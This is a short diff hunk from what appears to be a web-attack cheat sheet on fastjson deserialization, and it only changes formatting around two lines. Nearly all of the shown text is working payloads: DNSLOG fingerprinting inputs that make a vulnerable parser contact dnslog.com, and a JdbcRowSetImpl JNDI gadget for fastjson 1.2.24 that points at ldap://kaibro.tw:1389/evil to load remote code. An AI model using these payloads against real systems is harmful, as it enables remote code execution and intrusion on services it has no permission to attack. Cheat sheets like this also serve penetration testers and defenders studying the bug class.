@@ -3012,8 +3012,8 @@ print marshalled
             - `parseArray()`
         - Fingerprinting
             - DNSLOG: 
-                - `{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}`
-                - `{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`
+                - {% raw %}`{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}`{% raw %}
+                - {% raw %}`{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`{% raw %}
         - fastjson 1.2.24
             - fastjson <= 1.2.24
             - JdbcRowSetImpl gadget (JNDI): `{"@type" : "com.sun.rowset.JdbcRowSetImpl","dataSourceName" : "ldap://kaibro.tw:1389/evil","autoCommit" : true}`
